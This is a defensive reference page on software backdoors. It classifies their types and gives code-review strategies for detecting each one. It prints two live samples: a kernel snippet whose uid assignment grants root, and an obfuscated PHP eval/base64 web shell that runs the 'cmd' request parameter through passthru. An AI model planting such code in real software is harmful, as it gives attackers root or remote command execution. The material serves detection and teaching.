Backdoors
=========

.. contents::

Types of Backdoors
------------------
**System Backdoors** are backdoors that allow access to data and processes at the system level. Rootkits, remote access software, and delibrate system misconfiguration by an attacker fall in this category.

**Application Backdoors** are versions of legitimate software modified to bypass security mechanisms under certain conditions. These legitimate programs are meant to be installed and running on a system with the full knowledge and approval of the system administrator. Applications backdoors are often inserted in the code by someone who has legitimate access to the code. Other times the source code or binary to an application is modified by someone who has compromised the system where the source code is maintained or the binary is distributed.

**Crypto Backdoors** are a third category of backdoors. These are intentionally designed weaknesses in a cryptosystem for particular keys or messages that allow an attacker to gain access to clear-test messages that they shouldn't.

Application Backdoor Classes
----------------------------

**Special Credentials**
        The attacker inserts logic and special credentials into the program code. The special credentials are in the form of a special username, password, password hash, or key. The logic is a comparison to the special credential logic that inserts the special credential into the designed credential store.

**Detection Strategies** 
        include identifying static variables that look like usernames and passwords. Start with all strings using ASCII character set. Also inspect known crypto API calls where these strings are passed in as plaintext data.

Hidden Functionality
--------------------
**Hidden Functionality** backdoors allow the attacker to issue commands or authenticate without performing the desinged authentication procedure. Hidden funcitonality backdoors often use special parameters to trigger special logic within the program that shouldn't be there.

**Detection Strategies** 
        include recongnising common patterns in the scripting languages: create an obfuscated string, input into deobfuscation function, call eval() on the result of the deobfucsation. Payload code often allows command execution or auth bypass. Identify GET or POST parameters passed by web applications then compare them to form fields in HTML and JSP pages to find fields that only appear on the server side.

Uninntended Network Activity
----------------------------
This may involve a number of techniques including listening on undocuemented ports, making outbound connections to establish a command and control channel, or leaking sensitive information over the network via STMP, HTTP, UDP, ICMP or other protocols.

**Detection Strategies** 
        include identifying all locations in the codebase that call functions responsible for establishing connections or sending/receiving connectionless data, such as connect(), bind(), accept(), sendto(), listen() and recvfrom(). Once these calls have been identified pay particular attention to any outbound network activiity that reference a hard-coded IP address or port. Keep in mind that many applications have functionality built in to automaticallly chekc for updates, so seeing at least one hard-coded outbound connection is not uncommon.

**Manipulation of Security-Critical Parameters** 
        In any program, certain variables or parameters are more significant than others from a security standpoint. In application code, consider variables used to store the results of authentication or authorisation functions, or other security mechanisms. By directly manipulationg these parameters or introducing flawed logic to comparisons against them.

.. code-block:: c

        if ((options == (__WCLONE|__WALL)) &&
                (current->uid = 0))
                retval = -EINVAL;

The second half of the conditional assigns current->uid to zero rather than comparing it with zero. As a result, a calling process is granted root privilieges if it calls wait4() with the _WCLONE and _WALL options set.

Self-modifying Code
-------------------

Any code that modifies itself at run-time is immediately suspicious. This behaviour is used commonly in scripting languages but can just as easily appear in native code. Conider the following example in PHP

.. code-block:: php

        eval(base64_decode("cGFzc3RocnUoJF9HRVRbJ2NtZCddKTs="));

When the PHP script executes, this line of code evaluates the result of the base64_decode() operations as a PHP command. Therefore, if the decoded string contains valid PHP, it will be executed in the context of the running process.

.. code-block:: php

        eval("passthru($_GET('cmd'));})

The effect of the resulting code is to parse the "cmd" parameter from the HTTP request, and call the passthru() function, which executes the supplied command on the server.

